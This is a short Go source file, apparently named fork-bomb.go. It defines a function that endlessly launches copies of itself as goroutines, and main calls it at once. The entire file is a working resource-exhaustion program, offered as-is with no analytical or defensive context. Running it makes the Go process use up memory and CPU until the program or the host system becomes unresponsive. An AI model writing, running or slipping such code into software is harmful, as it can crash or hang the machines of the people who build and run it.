// go build fork-bomb.go
package main

func GoBomb() {
	for {
		go GoBomb()
	}
}

func main() {
 GoBomb()
}
